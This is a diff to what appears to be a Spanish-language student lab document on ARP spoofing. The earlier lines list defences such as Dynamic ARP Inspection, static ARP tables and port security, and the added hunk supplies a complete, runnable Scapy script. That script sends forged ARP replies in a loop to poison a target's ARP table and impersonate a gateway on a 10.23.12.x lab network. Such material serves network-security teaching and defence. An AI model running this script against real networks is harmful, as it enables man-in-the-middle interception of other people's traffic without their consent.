@@ -40,3 +40,30 @@ Dynamic ARP Inspection (DAI): Configuración en switches para validar que los pa
 Tablas ARP Estáticas: Mapeo manual de IP-MAC en dispositivos críticos (servidores o gateways).
 
 Port Security: Limitar el aprendizaje de MACs en los puertos de acceso del switch.
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+from scapy.all import *
+
+def arp_poison():
+    # Configuración basada en la matrícula 2023-1243
+    target_ip = "10.23.12.1"      # IP del Router Víctima
+    gateway_ip = "10.23.12.100"   # IP del Gateway a suplantar
+    
+    print(f"Envenenando la tabla ARP de {target_ip}...")
+    print(f"Haciendo creer al router que {gateway_ip} tiene nuestra dirección MAC.")
+    
+    # op=2: ARP Reply (Respuesta falsa enviada de forma proactiva)
+    # psrc: La IP que queremos robar
+    # pdst: El destino del engaño
+    pkt = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
+
+    try:
+        # Envío constante para evitar que la tabla ARP se corrija sola
+        send(pkt, loop=1, inter=1)
+    except KeyboardInterrupt:
+        print("\n[!] Ataque detenido. Restaurando red...")
+
+if __name__ == "__main__":
+    arp_poison()
